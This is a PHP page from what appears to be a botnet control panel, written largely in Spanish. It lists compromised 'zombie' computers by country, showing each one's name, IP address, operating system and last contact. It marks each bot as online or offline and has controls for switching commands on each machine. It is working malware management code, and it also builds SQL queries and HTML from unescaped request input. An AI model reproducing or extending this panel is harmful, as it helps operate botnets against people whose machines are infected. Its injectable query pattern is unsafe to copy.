<?php @session_start(); if ( !isset($_SESSION['login']) ){ header ("Location: ../../");  exit() ; }	?>
<?php 
require_once('../../includes.php'); 




$RegistrosAMostrar=45;

if(isset($_GET['pag'])){
	$RegistrosAEmpezar=($_GET['pag']-1)*$RegistrosAMostrar;
	$PagAct=$_GET['pag'];
}else{
	$RegistrosAEmpezar=0;
	$PagAct=1;
	
}



function SiNo($x , $id , $name){
	global $PagAct ; 
	
	if( $x == 1 ){
		return '<img src="archivos/heards/win.png" width="15" height="15" onclick="Des_Commands('.$id.' , \''.$name.'\');" class="pointer" />' ;
	} else {
		return '<img src="archivos/heards/win.png" width="15" height="15" onclick="Act_Commands('.$id.' , \''.$name.'\');" class="pointer" />' ;
	}
	
}


$f = date("Y-m-d"); ;
$h = date("H:i:s"); ;
$h2 = date("H:i:s",strtotime("-5 minute")); 


if( $_GET['pais'] == 'Unknown' ){
	$Sql_1 = "SELECT * FROM zombis WHERE pais IS NULL ORDER BY fecha DESC LIMIT " . $RegistrosAEmpezar." , ".$RegistrosAMostrar ;
	$Sql_2 = "SELECT * FROM zombis WHERE pais IS NULL AND time(fecha) > '".$h2."' AND time(fecha) < '".$h."'" ;
	$Zombis = $DB->Select($Sql_1);
	$Online = $DB->Select($Sql_2 , 'num_rows' , false);
	$Totales = $DB->Select("SELECT * FROM zombis WHERE pais IS NULL" , 'num_rows' , false);
	$NroRegistros = @mysql_num_rows(@mysql_query("SELECT * FROM zombis WHERE pais IS NULL"));
}

if( $_GET['pais'] == 'alls' ){
	$Zombis = $DB->Select("SELECT * FROM zombis ORDER BY fecha DESC LIMIT " . $RegistrosAEmpezar . " , " . $RegistrosAMostrar);
	$Online = $DB->Select("SELECT * FROM zombis WHERE time(fecha) > '".$h2."' AND time(fecha) < '".$h."'" , 'num_rows' , false);
	$Totales = $DB->Select("SELECT * FROM zombis" , 'num_rows' , false);
	$NroRegistros = @mysql_num_rows(@mysql_query("SELECT * FROM zombis"));
}

if( $_GET['pais'] != 'alls' && $_GET['pais'] != 'Unknown' ){
	$Sql_1 = "SELECT * FROM zombis WHERE pais='".$_GET['pais']."' ORDER BY fecha DESC LIMIT " . $RegistrosAEmpezar . " , " ;
	$Sql_1 .= $RegistrosAMostrar ;
	$Sql_2 = "SELECT * FROM zombis WHERE pais='".$_GET['pais']."' AND time(fecha) > '".$h2."' AND time(fecha) < '".$h."'" ;
	$Zombis = $DB->Select($Sql_1);
	$Online = $DB->Select($Sql_2 , 'num_rows' , false);
	$Totales = $DB->Select("SELECT * FROM zombis WHERE pais='".$_GET['pais']."'" , 'num_rows' , false);
	$NroRegistros = @mysql_num_rows(@mysql_query("SELECT * FROM zombis WHERE pais='".$_GET['pais']."'"));
}




for($i=0; $i<count($Zombis); $i++){
$Sql_3 = "SELECT * FROM zombis WHERE id='".$Zombis[$i]['id']."' AND time(fecha) > '".$h2."' AND time(fecha) < '".$h."'" ;
$ZombieOnline = $DB->Select($Sql_3 , 'num_rows' , false);
if( $ZombieOnline > 0 ){
	$HtmlOnline = '<font face="Tahoma" size="1"  color="#007900"> Online </font>' ;
} else {
	$HtmlOnline = '<font face="Tahoma" size="1" color="#FF2424"> Offline </font>' ;
}



	$ZMB .= '
<tr align="center" valign="middle">
    <td height="28" nowrap bgcolor="#000000"><div align="center" class="Estilo28">
      <font face="Verdana" color="#666666" size="1">'.$Zombis[$i]['id'].'</font></div></td>
   	<td height="28" nowrap bgcolor="#000000"><div align="center" class="Estilo28">
   	  <font face="Verdana" color="#666666" size="1">'.$Zombis[$i]['name'].'</font></div></td>
    <td height="28" nowrap bgcolor="#000000"><div align="center" class="Estilo28">
      <font face="Verdana" color="#666666" size="1">'.$Zombis[$i]['ip'].'</font></div></td>
   	<td height="28" nowrap bgcolor="#000000"><div align="center" class="Estilo28">
   	  <font face="Verdana" color="#666666" size="1"><img border="0" src="archivos/flags/'.strtolower($Zombis[$i]['flag']).'.png" width="16" height="11" alt="'.$Zombis[$i]["pais"].'" title="'.$Zombis[$i]["pais"].'">'.$Zombis[$i]['pais'].'</font></div></td>
    <td height="28" nowrap bgcolor="#000000"><div align="center" class="Estilo28">
      <font face="Verdana" color="#666666" size="1">'.$Zombis[$i]['host'].'</font></div></td>
   	<td height="28" nowrap bgcolor="#000000"><div align="center" class="Estilo28">
   	  <font face="Verdana" color="#666666" size="1"><img border="0" src="archivos/os/'.$Zombis[$i]["so"].'.png" width="16" height="16" alt="'.$Zombis[$i]["so"].'" title='.$Zombis[$i]["so"].'> '.$Zombis[$i]['so'].'</font></div></td>
	<td height="28" nowrap bgcolor="#000000"><div align="center" class="Estilo28">
	  <font face="Verdana" color="#666666" size="1">'.$Zombis[$i]['fecha'].'</font></div></td>
	  <td height="28" nowrap bgcolor="#000000"><div align="center" class="Estilo28">
	  <font face="Verdana" color="#666666" size="1">'.$Zombis[$i]['infos'].'</font></div></td>
    	<td height="28" nowrap bgcolor="#000000"><div align="center" class="Estilo28">
		     <font face="Verdana" color="#666666" size="1">'.SiNo($Zombis[$i]['idcmds'] , $Zombis[$i]['id'] , $Zombis[$i]['name']).'				</font>                   
   	</div></td>
    	<td height="28" nowrap bgcolor="#000000"><div align="center" class="Estilo28">
		     <font face="Verdana" color="#666666" size="1">'.$HtmlOnline.' </font>                   
   	</div></td>
</tr>


' ;
	
	
}

$NroRegistros=mysql_num_rows(mysql_query("SELECT * FROM zombis WHERE pais='".$_GET['pais']."'"));

if( $_GET['pais'] == 'Unknown' ){
	$NroRegistros=mysql_num_rows(mysql_query("SELECT * FROM zombis WHERE pais IS NULL"));
}

if( $_GET['pais'] == 'alls' ){
	$NroRegistros = @mysql_num_rows(@mysql_query("SELECT * FROM zombis"));
}

$PagAnt=$PagAct-1;
$PagSig=$PagAct+1;
$PagUlt=$NroRegistros/$RegistrosAMostrar;
$Res=$NroRegistros%$RegistrosAMostrar;
if($Res>0) $PagUlt=floor($PagUlt)+1;
?>

<div id="div_pais" name="div_pais" style="color:#FFFFFF; font:Verdana, Arial, Helvetica, sans-serif" align="center">
<font face="Verdana" size="1"><font color="#CCCCCC"><u>Pais</u> :</font> <?php echo $_GET['pais']; ?> 
<font color="#CCCCCC">| <u>Bots Online</u> :</font> <?php print_r($Online); ?> 
<font color="#CCCCCC">| <u>Total de Bots</u> :</font> <?php echo $Totales; ?>
</font><font face="Tahoma" size="2" color="#CCCCCC"> <br>
&nbsp;</font></div>
<style type="text/css">
<!--
.Estilo27 {
        border:1px dotted ; background-color: #000000;
        font-family: verdana, arial;
        font-size: 9pt 
}

.Estilo28 {
        border:1px dotted; background-color: #000000;
        font-family: verdana, arial;
        font-size: 9pt
}
-->
</style>

<div align="center">

<table width='50%' border='1' cellspacing='0' cellpadding='2' style="border-collapse: collapse" bordercolor="#666666" >
  <tr align="center" valign="middle">
    <td nowrap><div align="center" class="Estilo27">
      <font face="Verdana" color="#666666" size="1"> ID Number </font>
    </div></td>
    <td nowrap><div align="center" class="Estilo27">
      <font face="Verdana" color="#666666" size="1"> Name - Computer </font>
    </div></td>
    <td nowrap><div align="center" class="Estilo27">
      <font face="Verdana" color="#666666" size="1"> IP </font>
    </div></td>
    <td nowrap><div align="center" class="Estilo27">
      <font face="Verdana" color="#666666" size="1"> Country </font>
    </div></td>
    <td nowrap><div align="center" class="Estilo27">
      <font face="Verdana" color="#666666" size="1"> Ethernet Host </font>
    </div></td>
    <td nowrap><div align="center" class="Estilo27">
      <font face="Verdana" color="#666666" size="1"> Operating System </font>
    </div></td>
	<td nowrap><div align="center" class="Estilo27">
	  <font face="Verdana" color="#666666" size="1"><em> Date-Time </em></font>
	</div></td>
	<td nowrap><div align="center" class="Estilo27">
      <font face="Verdana" color="#666666" size="1"><em> Bot Status </em></font>
    </div></td>
    <td nowrap><div align="center" class="Estilo27">
      <font face="Verdana" color="#666666" size="1"><em> Commands </em></font>
    </div></td>
    <td nowrap><div align="center" class="Estilo27">
      <font face="Verdana" color="#666666" size="1"><em> Status </em></font>
    </div></td>
  </tr>




<?php echo $ZMB ; ?>
</table>
</div>



<div align="center"><?php
echo '<font face="Verdana" size="1" color="#FFFFFF" style="cursor:pointer">' ;
echo "<a onclick=\"Pagina('1' , '".$_GET['pais']."')\">First</a> ";
if($PagAct>1) echo "<a onclick=\"Pagina('$PagAnt' , '".$_GET['pais']."')\">Previous</a> ";
echo "<strong>Pagina ".$PagAct."/".$PagUlt."</strong>";
if($PagAct<$PagUlt)  echo " <a onclick=\"Pagina('$PagSig' , '".$_GET['pais']."')\">Following</a> ";
echo "<a onclick=\"Pagina('$PagUlt' , '".$_GET['pais']."')\">Last</a>";
echo '</div>' ;
?></div>